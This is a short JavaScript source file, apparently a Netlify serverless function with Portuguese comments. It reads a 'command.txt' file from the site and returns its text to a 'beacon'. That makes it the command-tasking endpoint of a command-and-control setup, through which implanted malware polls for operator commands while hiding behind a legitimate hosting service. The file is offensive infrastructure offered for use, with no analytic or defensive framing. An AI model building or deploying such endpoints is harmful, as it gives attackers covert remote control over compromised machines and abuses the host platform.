// netlify/functions/get.js
import fetch from 'node-fetch';

exports.handler = async (event, context) => {
    // 1. Obter o conteúdo do command.txt (como um arquivo estático no Netlify)
    
    // Assumimos que o command.txt está na raiz do seu site
    // O Netlify serve arquivos estáticos normalmente.
    const commandFileUrl = `${process.env.URL}/command.txt`;
    
    try {
        const response = await fetch(commandFileUrl);
        
        if (!response.ok) {
            return {
                statusCode: response.status,
                body: `Erro ao buscar command.txt: ${response.statusText}`,
            };
        }
        
        const command = await response.text();
        
        // 2. Retorna o comando para o beacon
        return {
            statusCode: 200,
            headers: {
                "Content-Type": "text/plain",
            },
            body: command.trim(), // Remove espaços/quebras de linha
        };
    } catch (error) {
        console.error('Erro na função get:', error);
        return {
            statusCode: 500,
            body: 'Erro interno do servidor ao ler comando.',
        };
    }
};
